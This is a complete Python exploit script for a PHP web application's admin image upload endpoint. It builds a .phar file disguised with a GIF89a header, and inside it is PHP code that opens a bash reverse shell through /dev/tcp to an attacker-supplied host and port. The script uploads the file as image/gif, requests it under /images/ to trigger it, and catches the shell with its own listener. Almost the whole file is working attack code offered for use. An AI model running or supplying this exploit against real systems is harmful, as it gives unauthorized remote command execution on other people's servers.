import sys
import socket
import threading
import time
import uuid
import os
import urllib.request



# create the listener 
def listener(lhost, lport, ready_evt):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((lhost, lport))
    server_socket.listen(1)
    print(f"[+] Listening on {lhost}:{lport} ...")
    ready_evt.set()

    client, addr = server_socket.accept()
    print(f"[+] Shell from {addr[0]}:{addr[1]}")

    def send_input():
        while True:
            try:
                data = sys.stdin.buffer.readline()
                if not data:
                    break
                client.send(data)
            except (BrokenPipeError, OSError):
                break
            except Exception:
                continue

    threading.Thread(target=send_input, daemon=True).start()

    while True:
        try:
            output = client.recv(4096)
        except OSError:
            break
        if not output:
            print("\n[-] Connection closed")
            break
        sys.stdout.write(output.decode(errors="ignore"))
        sys.stdout.flush()

    client.close()
    server_socket.close()

def create_payload_file(lhost,lport):
    random_filename = f"img_{uuid.uuid4().hex[:8]}.phar"
    payload = (
        b"GIF89a;\n"
        b"<?php system(\"setsid bash -c 'bash -i >& /dev/tcp/"
        + f"{lhost}/{lport}".encode()
        + b" 0>&1' 2>/dev/null &\"); ?>\n"
    )
    with open(random_filename, "wb") as file:
        file.write(payload)
    return random_filename


def send_payload(file_name,full_url):

    with open(file_name, "rb") as file:
        file_content = file.read()

    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
    b = boundary.encode()
    body = (
       b"--" + b + b"\r\n"
        b'Content-Disposition: form-data; name="title"\r\n\r\n'
        b"motd\r\n"
        b"--" + b + b"\r\n"
        b'Content-Disposition: form-data; name="image"; filename="' + file_name.encode() + b'"\r\n'
        b"Content-Type: image/gif\r\n\r\n"
        + file_content + b"\r\n"
        b"--" + b + b"--\r\n"
    )
    
    req = urllib.request.Request(full_url, data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            resp = response.read().decode(errors="ignore")
            ok = response.status == 200
            print(f"[{'+' if ok else '-'}] Upload status {response.status} "
                  f"({'Success' if ok else 'no Success marker'})")
            return ok
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return False

def trigger(fname, base_url):
    url = f"{base_url}/images/{fname}"
    print(f"[*] Triggering {url}")
    try:
        # short timeout: a detached shell won't return a response body
        urllib.request.urlopen(url, timeout=3)
    except Exception:
        pass 

def main():
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <lhost> <lport> <target_base_url>")
        print(f"  e.g. python3 {sys.argv[0]} 172.24.17.171 8090 http://localhost:8000")
        sys.exit(1)
 
    lhost = sys.argv[1]
    lport = int(sys.argv[2])
    base_url = sys.argv[3].rstrip("/")
    upload_url = f"{base_url}/admin/upload_image.php"

    ready = threading.Event()
    threading.Thread(target=listener, args=(lhost, lport, ready), daemon=True).start()
    ready.wait(timeout=5)

    file_name = create_payload_file(lhost,lport)
    print(f"[*] Payload: {file_name}")

    try:
        if not send_payload(file_name, upload_url):
            print("[-] Upload rejected - aborting trigger.")
            return
        time.sleep(1)                      # let the write settle
        trigger(file_name, base_url)
        while True:
            time.sleep(1)
    finally:
        if os.path.exists(file_name):
            os.remove(file_name)
    


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Bye.")